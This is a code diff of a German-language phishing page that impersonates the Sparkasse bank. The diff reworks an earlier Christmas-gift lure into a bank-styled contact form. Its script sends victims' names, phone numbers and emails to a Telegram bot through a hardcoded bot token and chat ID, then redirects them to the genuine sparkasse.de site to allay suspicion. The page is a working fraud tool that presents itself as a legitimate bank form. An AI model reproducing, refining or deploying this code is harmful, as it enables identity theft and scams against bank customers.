@@ -2,393 +2,222 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
+    <link rel="icon" type="image/x-icon" sizes="32x32" href="tenant_header_logo 2.svg">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎄 Sparkasse Geschenke</title>
+    <title>Sparkasse</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
-            padding: 0;
-            background: url('https://via.placeholder.com/1920x1080/ffffff/ffffff?text=New+Year+Background') no-repeat center center fixed;
-            background-size: cover;
-            animation: fadeIn 1s ease-in-out;
-            color: #333;
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
             display: flex;
             flex-direction: column;
-        }
-
-        /* Анимация появления */
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+            min-height: 100vh;
         }
 
         header {
-            background-color: red;
-            color: white;
-            padding: 20px 40px;
+            background-color: #e2001a;
+            padding: 15px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            position: relative;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            animation: slideIn 1s ease-in-out;
-        }
-
-        @keyframes slideIn {
-            from {
-                transform: translateY(-100px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
         }
 
         header img {
-            width: 50px;
-            height: auto;
-            border-radius: 8px;
+            height: 40px;
+            margin-left: 30px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        nav {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        nav a:hover {
+            text-decoration: underline;
+        }
+
+        .online-banking {
+            background-color: #fff;
+            color: #e2001a;
+            padding: 8px 12px;
+            border-radius: 5px;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .online-banking:hover {
+            background-color: #f0f0f0;
+        }
+
+        .container {
+            padding-right: 10px;
         }
 
         .form-container {
-            background-color: rgba(255, 255, 255, 0.9);
-            padding: 40px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 400px;
-            margin: 100px auto;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 50px;
+            border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-            animation: zoomIn 1s ease-in-out;
         }
 
-        @keyframes zoomIn {
-            from {
-                transform: scale(0.8);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-
-        h2 {
+        .form-container h2 {
             text-align: center;
-            margin-bottom: 20px;
-            color: red;
+            margin-bottom: 45px;
         }
 
-        input {
-            width: 93%;
-            padding: 12px;
-            margin: 15px 0;
-            border: 2px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-            transition: all 0.3s ease;
+        .form-group {
+            margin-bottom: 15px;
         }
 
-        input:focus {
-            border-color: red;
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 20px;
+            margin-bottom: 5px;
+            border: 1px solid #555;
+            border-radius: 10px;
+            font-size: 17px;
+            background-color: #222;
+            color: #fff;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus {
             outline: none;
+            border-color: #e2001a;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #e2001a;
+            margin-top: 23px;
+            border: none;
+            border-radius: 20px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-button:hover {
+            background-color: #b00016;
         }
 
         footer {
-            background-color: rgb(35, 35, 35);
-            color: white;
+            padding: 15px;
             text-align: center;
-            padding: 10px 0;
-            margin-top: auto;
-            animation: fadeUp 1s ease-in-out;
+            color: #aaa;
+            font-size: 12px;
         }
 
-        @keyframes fadeUp {
-            from {
-                transform: translateY(100px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        /* Добавление снежинок */
-        .snowflake {
-            position: absolute;
-            top: -10px;
-            z-index: -1;
-            opacity: 0.8;
-            animation: snow 10s linear infinite;
-        }
-
-        @keyframes snow {
-            0% {
-                transform: translateY(0) rotate(0);
-            }
-            100% {
-                transform: translateY(100vh) rotate(360deg);
-            }
-        }
-
-        .snowflake:nth-child(odd) {
-            animation-duration: 12s;
-            animation-delay: -2s;
-        }
-
-        .snowflake:nth-child(even) {
-            animation-duration: 15s;
-            animation-delay: -5s;
-        }
-
-        /* Кнопка в виде подарка */
-        .gift-button {
-            width: 100%; /* Задаём кнопку на всю ширину */
-            height: 50px;
-            background-color: #ff5858;
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 5px;
-            position: relative;
-            overflow: hidden;
-            cursor: pointer;
-            text-align: center;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .gift-button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-        }
-
-        .gift-button:before {
-            content: '\1F381'; /* Символ подарка */
-            font-size: 30px;
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-
-        .gift-button span {
-            position: relative;
-            z-index: 1;
-        }
-
-        /* Адаптивность для мобильных */
-        @media (max-width: 600px) {
-            .gift-button {
-                width: 100%; /* Кнопка будет на всю ширину */
-                height: 50px;
-                font-size: 16px;
-            }
-
+        @media (max-width: 480px) {
             header {
-                padding: 15px;
                 flex-direction: column;
                 align-items: flex-start;
+                gap: 10px;
+            }
+
+            nav {
+                flex-wrap: wrap;
+                gap: 10px;
             }
 
             .form-container {
-                padding: 30px;
-                width: 80%;
+                width: 90%;
+                padding: 15px;
             }
 
-            h2 {
-                font-size: 18px;
+            .form-group input {
+                font-size: 13px;
             }
 
-            footer {
-                padding: 15px 10px;
+            .submit-button {
+                font-size: 14px;
             }
         }
-
- /* Модальное окно */
-.modal {
-    display: none;
-    position: fixed;
-    z-index: 1000;
-    left: 0;
-    top: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    justify-content: center;
-    align-items: center;
-}
-
-.modal-content {
-    background-color: white;
-    padding: 30px;
-    border-radius: 10px;
-    text-align: center;
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-    animation: fadeInScale 0.5s ease-in-out;
-    width: 320px;
-}
-
-p {
-    margin: 20px 0 0;
-    font-size: 16px;
-    color: #333;
-}
-
-/* Анимация модального окна */
-@keyframes fadeInScale {
-    0% {
-        transform: scale(0.8);
-        opacity: 0;
-    }
-    100% {
-        transform: scale(1);
-        opacity: 1;
-    }
-}
-
-/* Контейнер для галочки */
-.checkmark-circle {
-    width: 80px;
-    height: 80px;
-    border-radius: 50%;
-    background: #4CAF50;
-    margin: 0 auto;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: relative;
-}
-
-.checkmark {
-    width: 25px; /* Уменьшено с 35px */
-    height: 45px; /* Уменьшено с 60px */
-    border: solid white;
-    border-width: 0 6px 6px 0; /* Уменьшено с 8px */
-    transform: rotate(45deg);
-    animation: checkmark 1s ease-in-out forwards;
-}
-
-
-@keyframes checkmark {
-    0% {
-        transform: scale(0) rotate(45deg);
-    }
-    100% {
-        transform: scale(1) rotate(45deg);
-    }
-}
-
-.form-container {
-    background-color: rgba(255, 255, 255, 0.9);
-    padding: 40px 20px;
-    border-radius: 10px;
-    width: 90%;
-    max-width: 400px;
-    margin: 100px auto;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-    animation: fadeInScale 0.5s ease-in-out;
-}
-
-
-
     </style>
 </head>
 <body>
-
-    <!-- Снежинки -->
-    <div class="snowflake" style="left: 10%; animation-duration: 14s; animation-delay: 1s;">❄</div>
-    <div class="snowflake" style="left: 20%; animation-duration: 11s; animation-delay: 2s;">❄</div>
-    <div class="snowflake" style="left: 30%; animation-duration: 13s; animation-delay: 0s;">❄</div>
-    <div class="snowflake" style="left: 40%; animation-duration: 16s; animation-delay: -1s;">❄</div>
-    <div class="snowflake" style="left: 50%; animation-duration: 14s; animation-delay: -3s;">❄</div>
-    <div class="snowflake" style="left: 60%; animation-duration: 17s; animation-delay: 4s;">❄</div>
-    <div class="snowflake" style="left: 70%; animation-duration: 12s; animation-delay: -4s;">❄</div>
-    <div class="snowflake" style="left: 80%; animation-duration: 14s; animation-delay: 3s;">❄</div>
-    <div class="snowflake" style="left: 90%; animation-duration: 16s; animation-delay: 2s;">❄</div>
-
     <header>
-        <!-- Логотип в виде изображения -->
-        <img src="Slogo.png" alt="Logo">
+        <img src="tenant_header_logo.svg" alt="Sparkasse Logo">
+        <nav>
+        </nav>
     </header>
 
-    <div class="form-container">
-        <h2>Formular ausfüllen</h2>
-        <form id="contactForm">
-            <input type="text" id="name" placeholder="Vor- und Nachname" required>
-            <input type="tel" id="phone" placeholder="Telefonnummer" value="+49" required>
-            <input type="email" id="email" placeholder="E-Mail-Adresse" required>
-            <button type="submit" class="gift-button"><span>Absenden</span></button>
-        </form>
+    <div class="container">
+        <div class="form-container">
+            <h2>Kontaktinformationen</h2>
+            <form id="contactForm">
+                <div class="form-group">
+                    <label for="firstName"></label>
+                    <input type="text" id="firstName" placeholder="Vorname" required>
+                </div>
+                <div class="form-group">
+                    <label for="lastName"></label>
+                    <input type="text" id="lastName" placeholder="Nachname" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone"></label>
+                    <input type="tel" id="phone" placeholder="Telefonnummer" required>
+                </div>
+                <div class="form-group">
+                    <label for="email"></label>
+                    <input type="email" id="email" placeholder="E-Mail" required>
+                </div>
+                <button type="submit" class="submit-button">Weiter</button>
+            </form>
+        </div>
     </div>
 
     <footer>
-        <p>© 2025 Alle Rechte vorbehalten</p>
+        <p>© 2025 Alle Rechte vorbehalten | Sparkasse</p>
     </footer>
-    <div id="successModal" class="modal">
-        <div class="modal-content">
-            <div class="checkmark-circle">
-                <div class="checkmark draw"></div>
-            </div>
-            <p>Formular erfolgreich ausgefüllt!</p>
-        </div>
-    </div>
-    
-    
 
     <script>
+        document.getElementById('contactForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
 
+            const botToken = '7999556199:AAEC3tCfjfVncG4LbLhGSFy9I9x5xiMan6M';
+            const chatId = '-4686099404';
 
-document.getElementById('contactForm').addEventListener('submit', function (event) {
-    event.preventDefault();
-    
-    const name = document.getElementById('name').value;
-    const phone = document.getElementById('phone').value;
-    const email = document.getElementById('email').value;
+            const message = `Neue Anfrage:\nVorname: ${firstName}\nNachname: ${lastName}\nTelefonnummer: ${phone}\nE-Mail-Adresse: ${email}`;
 
-    const botToken = '7999556199:AAEC3tCfjfVncG4LbLhGSFy9I9x5xiMan6M';
-    const chatId = '-4686099404';
-    
-    const message = `Neue Anfrage:\nName: ${name}\nTelefonnummer: ${phone}\nE-Mail-Adresse: ${email}`;
-    
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
-        method: 'GET'
-    })
-    .then(response => response.json())
-    .then(data => {
-        showSuccessModal();
-
-        // Очищаем инпуты после успешной отправки
-        document.getElementById('contactForm').reset();
-    })
-    .catch(error => {
-        alert("Fehler beim Senden der Daten.");
-    });
-});
-
-
-function showSuccessModal() {
-    const modal = document.getElementById('successModal');
-    modal.style.display = 'flex'; // Показываем модальное окно
-    setTimeout(() => {
-        modal.style.display = 'none'; // Скрываем через 3 секунды
-    }, 6000);
-}
-
-        
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
+                method: 'GET'
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Das Formular wurde erfolgreich ausgefüllt. Unsere Mitarbeiter werden sich in Kürze mit Ihnen in Verbindung setzen.");
+                window.location.href = 'https://sparkasse.de'; 
+            })
+            .catch(error => {
+                alert("Fehler beim Senden des Formulars.");
+            });
+        });
     </script>
-
 </body>
 </html>
